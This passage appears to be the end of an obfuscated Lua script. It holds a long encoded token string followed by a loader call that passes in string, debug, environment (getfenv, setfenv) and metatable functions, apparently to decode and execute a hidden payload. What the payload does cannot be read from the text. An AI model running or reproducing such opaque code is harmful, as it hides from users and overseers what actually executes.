3R423R1U33RP35BS3R4L3R153D1G3R5B3R2Q3R4Q3R4337QV3R003HFD3R533QZ13R4C1H3R0036RW3QXQ3R4W3NUH3R5633ZR1I3R0032JO3R5K3R303R4B3R5N1J3R0036GJ3R5R3R2J3R0R1K3R00341B3QXD3QZ93R5C3R5M3R5E2401L3R0033ZB3R6C3R5D3R2K2403KZL3R5H3QYA35VJ3R653R3B3R673R6M1N3R0034TG3R6R3R6L3R6T1O3R0034J13R6Z3R3T3R713R6T1P3R0034S13R763R4I3R5N1Q3R00366V3R7J3R7E3R0R1R3R0031I63R7C3R4A3R553R3V350B3R00348K3R7P3R7X3R4C1T3R0035V63R823R4X3R7Y1U3R0034FN3R6I3R0B3R543R893R4C1V3R0035UJ3R883R5Z3R7Y103R0037233R4V3R3J3R833R5N113R003KE43R8E3R5Y3R0F3R0R123R003CNU3R7V3R8G3R8N3R4C133R0039XZ3R8M3R913O3W143R003MOI3R963R5S3R5N153R0036I83R9D3R323NSM3KYM3R6W3QWC34B23R9J3R6D3O3W3KYA3R9T3QZ6371F3R9P3R6033RP183R0032HO3R9W3R6S3R0R3KXT3RA036G236T43R5X3R8T3R8H3R5N1A3R003L2D3RA93R773R0R1B3R0034F03RA33R7Y1C3R003A8S3RAT3R4C1D3R0034LO3RAN3R7K3R6M1E3R0035XA3R8Z3RAH3R983R5N1F3R003L3Z3RB33R7Q3O3W21C3R00386Y3RAY3R5N21D3R003CAG3RBG3R8U3R6M21E3R0036SL3RBM3R6M21F3R003L5D3RBR3RAI3R6M21G3R0037343RAG3R413RAO3O3W21H3R0035WV3RB93RC93RB43R6T3L1P3RAD316Q35O43RC23RBB3R6M21J3R0035VT3RBX3R6T21K3R003L753RCN3R9E3P8521L3R0036JI3RCT3R0R21M3R0034YF3RCF3R4H3RBH3P8521N3R0036JM3RD43O3W21O3R003L873RCY3R9Q3QU821P3R0039OO3RD93R4P3RCH3R0R21Q3R0034I33RDL3RA431JR3R0038JJ3RDY3R7Y1W3R0034YV3RE33R4C1X3R0036UC3RC83RDA3RBS3R6T1Y3R0034W23RDG3P851Z3R0033R03RE83R5N2103R0034G13REP3R6M2CV3RCK3NFX3REU3R6T3L0S3REX35YR3RDR3R6K3RDT3O3W3L0G3REX34WN3REZ3R0R2143R0036KT3PYU3R0W3REE3GJ03QPK35LG38EO3GJ33RAA3O3W3L003REX3KFS3RFG3R183RDS3EWM3RFK2BL3RFM3EWQ3RFO3P852163R00369X3RFT3R6J3R5L3QF03RFX3KLP3RFN3RCA3P852173R0032KI3A3Y3R0M3RCG3RFW3FR83RFZ3ICA3RCO3R6T2183R0036TG33F63RGJ3RFI3QPJ3RGM3R0Y3R9X3P852193R0035YD3RG63R8F3QTU3OVD3QF03RGN3A8B3RCZ3NSM21A3R003NJG3B1K3RGV3RGL3HA53RHA3Q093GJ0358B3R703REF3R0R21B3R0035YO3R8S3QXF3RGA3KKP35LG3RHM3GIR3RHO3R7D3RHQ3O3W2283R003KIB2833RHI3FR53RHX3RHL3RGZ3RBA3RHC3QU82293R003CMS3RHH3RFH3RHJ3QXF3RID3HA53RI23R7W3RC33R6T22A3R003ESP3RI93RIM3RIB3RGY3HA53RI03RGC3RGW3RIG3QW722B3R003NN83RIL3RFU3RJ03RHK3FR83RJ33RG03RGK3RI43P8522C3R00374C3R1Q3RHW3R903RDM3QW722D3R003NNP3R173RG73RGX3RIF3RJR33ZR3L3Q3REX3QLE3RJW3R8F3RHX3R9K3R6M22F3R003ESB3RJO3RG93RJQ3RDZ22G3R003NPP3RK53FR83RK73RH03NSM22H3R0036BK3RKD3RIN3RJ53RK033RP22I3R00332Z3RKK3HA53RKM3RG13NSM22J3R0034M53RL03RJP3RJZ3RDZ22K3R003KII33BQ3RIA3RFJ3RKF3R7Y22L3R0033CN3RL83RKE3RLA3R7Y22M3R0036083RKS3RJD3RJI3RIT3R0R22N3R003QGA3RLF3RIZ3RLH3RLP3R4C21S3R0033G13RLN3EWM3QE23RHP3RLX3O3W21T3R003NUP3RMA3FR53RMC3RI33RME3P852L33REX36AX3RLU3GJ03RML3RIS3RGP3R0R21V3R003KU23RMJ3RMT3RLI3R4C21W3R0036UM3RMS3GIR3RMU3R973RJ633ZR21X3R0035ZV3RN835LG3RNA3RK83R6T3L2U3REX3KIU3RNH2BL3RNJ3RKN3QU83L2J3REX36053RNP3HYS3RLW3RMW3O3W2203R0038DS3RN13RN93RN33R5N3L233REX3NZA3RO53RNI3RO73R6M2223R003EJX3RNX3L5J3RKU3RDZ2233R0035Q73ROC3RNQ3ROE3R6T2243R00377G3ROQ3RNY3ROL3R7Y2253R003O1Z3ROX3ROK3RFV3RJJ3NSM2263R003O2N3RP43RNR3RL33QU82273R002Z83RPC3ROS3R0R2343R0038E93RPJ3RM53R5N2353R00351Z3ROJ3RPD3RGD3PHL3R003O4F3RFB3O3W2373R0021D3QC53RM33R663RP73QU82383R0039OJ3RHV3ROZ3R4C2393R00352U3RQ13P853L5P3REX3O623RQK3NSM23B3R0035303RQP3G6U33RP3O6V3PZ433ZR23C3PO833Q533RP3QGU34CT3QHD3QGY33RP3COG3PEC34CT23D3QFS34CT31S53FMK33RP3PQX3QCF3KKJ2BN3RQ53KKO2BN3KKS337B3GZT2BN3KL132HV3KL63L3B34FR23E339S34FR31TI3CYX3A4V35R53O7B3I2G3RFL3FR83QBX3DZU3FR83RRK3FR53CTR3RG83EWM3RRN3GIR3RRP3FR53RRR388Z34FR3A1R343A3DP13MTF24023F3QTE34P134ZA33U23RMD3QU33FR83QTL35LG3QF33RSA3HA53RSQ3FR53QU63QEV3QVS33RP3CZ039DL37GE',{},40,2^16,{},"\115\116\114\105\110\103",'',string.byte,string.char,string.sub,table.concat,(math.ldexp or(function(a,b)return a*(2^b);end)),(getfenv or function()_ENV['\95\69\78\86']=_ENV;return _ENV end),setmetatable,select,next,math.floor,string.format,(unpack or table.unpack),tonumber,table.insert,string.gmatch,tostring,type,_VERSION,pcall,string.match,string.find,(debug.getinfo or debug.info),string.len,rawset,string.gsub,math.random,(table.find or function(a,b)for c,d in next,a do if d==b then return c;end;end return nil;end),rawget,_G,print,setfenv);end;
